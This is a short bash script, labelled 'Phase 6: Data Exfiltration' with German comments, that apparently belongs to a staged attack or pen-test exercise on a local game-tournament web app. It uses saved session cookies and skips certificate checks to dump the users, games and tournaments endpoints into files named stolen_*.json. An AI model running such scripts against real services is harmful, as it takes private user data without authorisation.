#!/bin/bash
echo "=== PHASE 6: DATA EXFILTRATION ==="

# Liste alle User
curl -k -X GET https://localhost:8443/api/users \
  -b cookies.txt > stolen_users.json

# Liste alle Games
curl -k -X GET https://localhost:8443/api/games \
  -b cookies.txt > stolen_games.json

# Liste alle Tournaments
curl -k -X GET https://localhost:8443/api/tournaments \
  -b cookies.txt > stolen_tournaments.json

echo "\n✅ Data exfiltrated to:"
ls -lh stolen_*.json

